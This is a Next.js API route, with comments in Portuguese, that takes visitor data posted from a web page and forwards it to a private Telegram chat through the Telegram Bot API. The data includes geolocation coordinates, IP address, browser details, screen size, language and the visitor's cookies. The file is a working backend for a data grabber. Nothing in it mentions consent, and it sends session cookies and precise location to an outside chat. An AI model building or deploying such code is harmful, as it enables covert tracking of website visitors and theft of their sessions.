// app/api/send-data/route.js
import { NextResponse } from 'next/server';
import axios from 'axios'; // Certifique-se de ter instalado axios

// Variáveis de ambiente devem ser prefixadas com NEXT_PUBLIC_ se você precisar delas no *cliente*
// Para API routes (backend), nomes normais funcionam, lidos de process.env
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Handler para requisições POST
export async function POST(request) {
  console.log(">>> Next.js API /api/send-data received request <<<");

  // Verifica se as variáveis de ambiente estão carregadas
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("Erro: Variáveis de ambiente TELEGRAM_BOT_TOKEN e/ou TELEGRAM_CHAT_ID não definidas no backend!");
    return NextResponse.json(
        { success: false, message: "Configuração do servidor incompleta." },
        { status: 500 }
    );
  }

  let body;
  try {
    body = await request.json(); // Pega o corpo da requisição
    console.log("Dados recebidos:", body);
  } catch (error) {
    console.error("Erro ao parsear JSON do corpo da requisição:", error);
    return NextResponse.json({ success: false, message: "Dados inválidos (JSON malformado)." }, { status: 400 });
  }


  if (!body || typeof body !== 'object') {
      console.error("Corpo da requisição inválido ou ausente.");
      return NextResponse.json({ success: false, message: "Dados inválidos." }, { status: 400 });
  }

  // Desestruturação segura
  const {
      latitude = 'N/A', longitude = 'N/A', ip = 'N/A', userAgent = 'N/A',
      screenWidth = 'N/A', screenHeight = 'N/A', language = 'N/A',
      cookies = 'N/A', connection = {}
  } = body;

  const connectionType = connection.type || 'N/A';
  const connectionDownlink = connection.downlink || 'N/A';

  const message = `
  Dados do usuário (Next.js):
  - Localização: ${latitude}, ${longitude}
  - IP: ${ip}
  - Navegador/SO: ${userAgent}
  - Resolução: ${screenWidth}x${screenHeight}
  - Idioma: ${language}
  - Cookies: ${cookies}
  - Conexão: ${connectionType}, Downlink: ${connectionDownlink} Mbps
  `;

  console.log("Mensagem a ser enviada:", message);

  try {
    console.log("Tentando enviar para o Telegram...");
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      // parse_mode: 'Markdown' // Opcional, se quiser formatar com markdown
    });
    console.log("Mensagem enviada para o Telegram com sucesso!");
    // Retorna uma resposta de sucesso para o frontend
    return NextResponse.json({ success: true, message: "Dados recebidos e enviados ao Telegram." });

  } catch (error) {
    console.error("Erro ao enviar para o Telegram:", error.response ? error.response.data : error.message);
     // Retorna uma resposta de erro para o frontend
    return NextResponse.json(
        { success: false, message: "Erro ao processar ou enviar dados para o Telegram." },
        { status: 500 } // Usa o status 500 para erro interno do servidor
    );
  }
}